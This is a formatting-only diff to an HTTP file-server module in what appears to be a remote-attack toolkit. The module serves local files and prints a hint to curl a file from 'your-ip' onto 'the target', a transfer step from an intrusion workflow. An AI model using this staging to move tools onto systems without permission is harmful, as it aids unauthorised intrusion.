@@ -3,7 +3,6 @@ from rmsectkf.core.modules.remote.remote_module import RemoteModule
 import http.server
 import socketserver
 
-
 '''
 HttpFileServerModule
 '''
@@ -30,8 +29,11 @@ class HttpFileServerModule(RemoteModule):
         print("start server on port {}".format(self.option_lport.value))
         with socketserver.TCPServer(("0.0.0.0", self.option_lport.value),
                                     http.server.SimpleHTTPRequestHandler) as server:
-            print("use curl http://your-ip:{}/file to get the file you want on the target.".format(self.option_lport.value))
+            print("use curl http://your-ip:{}/file to get the file you want on the target.".format(
+                self.option_lport.value))
             server.serve_forever()
+
+
 def get_module():
     return HttpFileServerModule()
 
